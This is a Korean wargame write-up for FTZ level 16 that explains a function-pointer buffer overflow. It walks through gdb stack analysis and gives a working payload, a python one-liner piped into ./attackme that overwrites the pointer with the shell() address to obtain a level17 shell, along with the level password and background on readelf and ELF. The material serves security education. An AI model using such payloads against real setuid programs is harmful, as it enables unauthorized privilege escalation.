# FTZ 16  
## 문제 설명  
attackme 프로그램을 공격하자. attackme 소스코드는 hint에 적혀있다. 소스코드는 아래와 같다.
```
#include <stdio.h>

void shell() {
  setreuid(3097,3097);
  system("/bin/sh");
}

void printit() {
  printf("Hello there!\n");
}

main()
{ int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  call();
}
```
attackme 파일의 소유자는 level17이다.  
따라서 shell을 호출하도록 유도하여 쉘을 획득해야할 것 같다!  
buf는 20 byte인데 fgets(buf, 48, stdin);에서 48byte나 읽어들여오니 bof 공격을 수행하면 되겠다!  

## 문제 풀이  
```
#include <stdio.h>

void shell() {              // shell 함수 선언
  setreuid(3097,3097);      // level17의 ruid, euid set
  system("/bin/sh");        // /bin/sh 쉘 실행
}

void printit() {            // printit 함수 선언
  printf("Hello there!\n");
}

main()
{ int crap;
  void (*call)()=printit;   // printit 함수를 call 포인터 함수에 저장
  char buf[20];
  fgets(buf,48,stdin);
  call();
}
```
**함수 포인터(function pointer)**  

함수를 가리키는 변수. 즉, 함수의 주소를 저장하는 변수다.  
* 표기법: 반환값 자료형 (*함수포인터이름) (매개변수)  

```
void (*fp)();   // 반환값과 매개변수가 없는 함수 포인터 fp 선언

fp = hello;     // hello 함수의 메모리 주소를 함수 포인터 fp에 저장
fp();           // Hello, world!: 함수 포인터로 hello 함수 호출

fp = bonjour;   // bonjour 함수의 메모리 주소를 함수 포인터 fp에 저장
fp();           // bonjour le monde!: 함수 포인터로 bonjour 함수 호출
```  

call 함수 포인터에 printit이 아니라 shell 함수를 넣으면 될 것 같다!!  

1. 먼저 gdb를 이용하여 스택구조를 파악해보자!  
<img width="323" alt="1" src="https://user-images.githubusercontent.com/46364778/89729233-815f8500-da6e-11ea-8015-f43515008692.PNG">  

* ```sub esp, 0x38```: 0x38=56byte를 확보했다.  
* ```mov DWORD PTR [ebp-16], 0x8048500```  
```mov eax, DWORD PTR [ebp-16]```  
```call eax```: 를 보아 ebp-16 위치에는 call 함수 포인터가 있고 0x8048500은 printit 함수의 주소인 것 같다.  

* ```lea eax, [ebp-56]```  
```push eax```  
```call <fgets>``` : 를 보아 char buf[20]에는 56byte가 할당이 되어 있다! 처음 ```sub esp, 0x38```로도 알 수 있었던 사실!  

2. buf에서 call 함수 포인터까지 거리는 40이므로 여기까지만 파악해도 payload를 작성할 수 있다!  
그럼 이제 call 함수 포인터에 shell() 함수의 주소값을 넣어야 하므로, shell() 함수 주소값을 확인해보자!  
gdb의 p 명령어를 이용하면 된다.  
```
(gdb) p shell
$1 = {<text variable, no debug info>} 0x80484d0 <shell>
```  

3. 그럼 이제 페이로드를 작성해 보자!  
```
(python -c 'print "\x90"*40 + "\xd0\x84\x04\x08"'; cat) | ./attackme
```  

4. level 17의 비밀번호는 "king poetic"  

### 외전: 정확한 스택 구조 파악  
일단 대략적인 스택 구조는 아래와 같다.  
참고로 포인터의 크기는 4byte이다. (주소를 저장하는 변수이므로)  

ret [4]|
|:---:|
|sfp [4]|
|crap [4]|
|call [4]|
|buf [20]|

그리고 위의 gdb를 통해 dummy값을 포함하여 알아낸 정보는 아래와 같다.  
buf에서 call까지 거리가 40이고 buf는 20byte이므로 **buf와 call 사이 dummy는 20byte**다!  
call은 sfp로부터 16byte떨어져 있다.  
call은 4byte, crap은 4byte이므로 남은 8byte의 dummy가 있다.
그간의 경험으로 **sfp와 그 다음 변수 사이에는 항상 dummy가 존재**했으므로 8byte의 dummy도 이 부분에 있을 확률이 높다! (확인하고 싶으면 level14, 15에서 이용한 dummy찾기 방법을 활용하자)  

따라서 정확한 스택 구조는 아래와 같다!  
ret [4]|
|:---:|
|sfp [4]|
|dummy[8]|
|crap [4]|
|call [4]|
|dummy[20]|
|buf [20]|


### 외전: gdb를 사용하지 않고 shell에서 함수 주소를 확인하는 방법  

```readelf [옵션] [프로그램 명]```

* readelf 는 BFD(Binary File Descriptor) 라이브러리를 이용하지 않고 직접 ELF(Executable and Linkable Format)를 읽기 위한 Tool 로써 BFD에 의존적이지 않은 프로그램을 elf 파일 문제인지 BFD 문제인지 쉽게 구분할 수 있다.   
* BFD를 경유하지 않고 ELF 파일을 읽어내기 때문에 objdump 보다 상세한 정보가 출력된다.  

* 옵션  
> <ELF 헤더 정보>  
-h : ELF 파일 헤더 정보  
-l : 프로그램 헤더  
-S : 섹션 헤더  
-e : 위 3가지 헤더 출력  

> <ELF 정보>  
-s : 심볼 테이블  
-r : 재배치 정보  
-d : 동적 세그먼트  
-V : 버젼 섹션  
-A : 아키텍처 의존정보  
-I : 버킷 리스트 길이 히스토그램  
-a : 모든 헤더 및 정보  

![2](https://user-images.githubusercontent.com/46364778/89729527-8d007b00-da71-11ea-9ad8-a88828111035.jpg)  

< readelf 를 통하여 심볼테이블에서 shell 및 printit 함수 주소 확인 >

[출처](https://moc0.tistory.com/19?category=672517)


## 그 외  
### BFD  
Binary Descriptor Library
다양한 형식의 오브젝트 파일의 호환성을 위한 GNU 프로젝트의 주 매커니즘  
[출처](https://devanix.tistory.com/186)  

### ELF  
Excutable and Linkable Format : **실행 가능한 바이너리** 또는 **오브젝트 파일** 등의 형식을 규정한 것이다.  
ELF 파일 = ELF 헤더 + 프로그램 헤더 테이블 + 섹션 헤더 테이플  
오브젝트 파일은 세 가지 종류가 있다.
- 재배치 가능한 파일(relocatable file) : 코드와 데이터를 다른 오브젝트 파일과 링킹될 수 있도록 함  
- 실행 파일(executable file) : 코드와 데이터를 타겟 운영체제에서 실행시킬 수 있도록 함  
- 공유 오브젝트 파일(shared object file) : 재할당 가능한 데이터를 정적 혹은 동적으로 다른 공유 오브젝트들과 공유할 수 있도록 함  

즉, ELF는 2가지 view를 가진다.  
이 뷰에 따라 각 ELF는 여러가지 부분(section, segment, header, table) 들로 나뉜다.  
<img width="588" alt="3" src="https://user-images.githubusercontent.com/46364778/89729718-604d6300-da73-11ea-8e2f-c06e1e86b08a.PNG">  

Linking View vs Execution View

![4](https://user-images.githubusercontent.com/46364778/89729721-62172680-da73-11ea-9562-3bdb7fa0e20a.png)  

* ELF Header  
```readelf -h```  
> 파일의 구성을 나타내는 로드맵과 같은 역할을 하며, 첫 부분을 차지한다.  
이 부분은 Linkable이던 Executable이던 무조건 가지고 있다.  
elf 헤더는 현재 efl에 대한 정의를 한다.  
program header table과 section header table의 위치를 결정한다.  

* Program Header  
```readelf -l```  
> 시스템에 어떻게 프로세스 이미지를 만들지를 지시  
프로세스 이미지를 만들기 위해서 사용되는 파일은 반드시 프로그램 헤더 테이블을 가져야 하며 재배치 가능 파일의 경우엔 가지지 않아도 된다.  

> **실행 가능** 파일에만 있다. 물론 공유 Object 파일에도 있다.  
이 테이블은 segment의 타입, 파일 오프셋, 물리주소, 가상주소, 파일크기, 메모리 이미지 크기, 정렬방식 등을 정의한다.  
여러 linkable 파일들의 섹션을 링커가 돌면서 통합해주고, 이것들에 대한 정보를 이 테이블에 갖고 있는다.  

* Section Header  
```readelf -S```  
> 파일의 섹션들에 대해서 알려주는 정보를 포함.  
모든 섹션은 이 테이블에 하나의 엔트리(entry)를 가져야 한다.  
각각의 엔트리는 섹션 이름이나, 섹션의 크기와 같은 정보를 제공해 준다.  
만약 파일이 링킹하는 동안 사용된다면, 반드시 섹션 헤더 테이블을 가져야 하며, 다른 object 파일은 섹션 헤더 테이블을 가지고 있지 않을 수도 있다.  
이에 해당하는 정보들은 리눅스의 경우 ~/include/linux/elf.h에서 찾을 수 있다.  

> **링킹 가능** 파일에만 있다. 물론 공유 Object 파일에도 있다.  
이 테이블은 section들의 이름, 메모리, 시작주소(if loadable), 파일 오프셋, 크기, 정렬방식, 표현방식 등을 정의한다.  

* Section  
> 링킹을 위한 object 파일의 정보를 다량으로 가지고 있으며, 이에 해당하는 것으로는 명령, 데이터, 심볼 테이블, 재배치 정보 등이 들어간다.  

즉, section과 segment는 다른 것이 아니라 유사한 섹션들을 모아놓은 것이 세그먼트이다.  
그렇다면 왜 구분할까? 목적이 다르기 때문이다.  
Section, 즉 링킹 가능 파일은 링킹이 편리하게 되기 위해!(실행 가능 파일로 만들 때 여러 링킹 가능 파일의 섹션을 모아 하나의 큰 섹션으로 만듬)  
Segment, 즉 실행 가능 파일은 exec 시스템 콜에 의해, 다시 말해 ELF-Loader에 의해 로드되기 or 링킹(라이브러리)되기 쉽게 하기 위해!  

결론적으로 ELF는 ABI(application Binary Interface)로써 실행과 링킹을 유용하게 하려고 각 용도에 따라 섹션이나 세그먼트를 나누어 두고 프로그램의 실행을 원활하게 하기 위해 사용하는 것이다.  

[출처1](http://blog.naver.com/PostView.nhn?blogId=xogml_blog&logNo=130143099472)  
[출처2](https://pu1et-panggg.tistory.com/32)  

